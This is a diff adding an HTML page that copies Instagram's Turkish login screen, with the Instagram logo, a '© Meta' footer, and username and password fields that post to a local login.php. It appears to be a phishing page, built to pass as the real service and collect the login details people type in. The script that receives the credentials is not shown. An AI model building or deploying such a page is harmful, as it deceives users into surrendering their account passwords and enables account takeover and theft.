@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #0a0a0a;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      color: white;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .language {
+      position: absolute;
+      top: 20px;
+      color: #a8a8a8;
+      font-size: 14px;
+    }
+
+    .logo {
+      width: 82px;
+      height: 82px;
+      margin-bottom: 40px;
+    }
+
+    .input-container {
+      width: 100%;
+      max-width: 280px;
+    }
+
+    input {
+      width: 100%;
+      padding: 13px 10px;
+      margin: 6px 0;
+      background: rgba(255,255,255,0.08);
+      border: 1px solid rgba(255,255,255,0.15);
+      border-radius: 6px;
+      color: white;
+      font-size: 15px;
+    }
+
+    input::placeholder {
+      color: #a8a8a8;
+    }
+
+    .login-btn {
+      width: 100%;
+      max-width: 280px;
+      padding: 11px;
+      margin-top: 15px;
+      background: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .meta {
+      position: absolute;
+      bottom: 30px;
+      color: #a8a8a8;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="language">Türkçe</div>
+
+  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
+
+  <div class="input-container">
+    <form method="POST" action="login.php">
+      <input type="text" name="username" placeholder="Kullanıcı adı, e-posta veya cep numarası" required>
+      <input type="password" name="password" placeholder="Şifre" required>
+      <button type="submit" class="login-btn">Giriş yap</button>
+    </form>
+  </div>
+
+  <div class="meta">© Meta</div>
+</body>
+</html>
